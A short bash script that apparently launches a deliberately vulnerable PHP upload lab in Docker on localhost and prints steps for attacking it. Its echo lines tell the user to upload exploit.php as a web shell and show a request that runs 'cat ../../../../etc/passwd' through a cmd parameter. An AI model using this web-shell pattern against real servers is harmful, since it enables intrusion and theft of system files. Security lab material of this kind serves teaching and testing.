#!/bin/bash

echo "Goto http://localhost:8080/index.php"
echo "Upload the exploit.php and use the reverse shell, e.g. http://localhost:8080/uploads/exploit.php?cmd=cat%20../../../../etc/passwd"
docker run --rm -p 8080:80 -v $(pwd)/index.php:/var/www/html/index.php php:apache

